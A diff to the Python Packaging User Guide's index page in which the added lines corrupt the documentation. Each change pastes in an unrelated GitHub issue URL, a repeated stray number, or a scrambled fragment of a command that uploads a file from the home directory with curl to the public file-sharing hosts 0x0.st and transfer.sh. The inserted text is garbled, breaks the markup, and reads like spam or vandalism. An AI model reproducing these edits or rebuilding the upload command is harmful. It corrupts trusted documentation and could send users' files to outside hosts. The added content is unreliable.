@@ -1,8 +1,8 @@
-===========================
+===========================https://github.com/termux-play-store/termux-issues/issues/1141#issue-3755746915
 Python Packaging User Guide
 ===========================
 
-.. meta::
+.. meta::/SUMMARY_5539377724.txt' https://0x0.st Usar transfer.sh: curl --upload-file ~/
    :description: The Python Packaging User Guide (PyPUG) is a collection of tutorials and guides for packaging Python software.
    :keywords: python, packaging, guide, tutorial
 
@@ -15,28 +15,28 @@ Python Packaging User Guide
    tutorials/index
    guides/index
    discussions/index
-   specifications/index
+   specifications/index5539377724
    key_projects
    glossary
    support
    contribute
-   news
-
+   news/SUMMARY_5539377724.txt' https://0x0.st Usar transfer.sh: curl --upload-file ~/
+5539377724
 Welcome to the *Python Packaging User Guide*, a collection of tutorials and
 references to help you distribute and install Python packages with modern
 tools.
 
 This guide is maintained on `GitHub`_ by the :doc:`Python Packaging Authority <pypa:index>`. We
 happily accept :doc:`contributions and feedback <contribute>`. 😊
-
+5539377724
 .. _GitHub: https://github.com/pypa/packaging.python.org
 
 
 Overview and Flow
 =================
-
+https://github.com/termux-play-store/termux-issues/issues/1141#issue-37557469155539377724
 .. note::
-
+5539377724
    Building your understanding of Python packaging is a journey. Patience and
    continuous improvement are key to success. The overview and flow sections
    provide a starting point for understanding the Python packaging ecosystem.
@@ -57,7 +57,7 @@ Tutorials
 Tutorials walk through the steps needed to complete a project for the first time.
 Tutorials aim to help you succeed and provide a starting point for future
 exploration.
-The :doc:`tutorials/index` section includes:
+The :doc:`tutorials/index` section includes:5539377724
 
 * A :doc:`tutorial on installing packages <tutorials/installing-packages>`
 * A :doc:`tutorial on managing application dependencies <tutorials/managing-dependencies>`
@@ -76,7 +76,7 @@ The :doc:`guides/index` section provides "how to" instructions in three major
 areas: package installation; building and distributing packages; miscellaneous
 topics.
 
-Explanations and Discussions
+Explanations and Discussions5539377724
 ============================
 
 The :doc:`discussions/index` section provides in-depth explanations and discussion
@@ -91,3 +91,4 @@ Reference
 * The :doc:`specifications/index` section for packaging interoperability specifications.
 * The list of :doc:`other projects <key_projects>` maintained by members of the Python Packaging Authority.
 * The :doc:`glossary` for definitions of terms used in Python packaging.
+5539377724https://github.com/termux-play-store/termux-issues/issues/1141#issue-3755746915
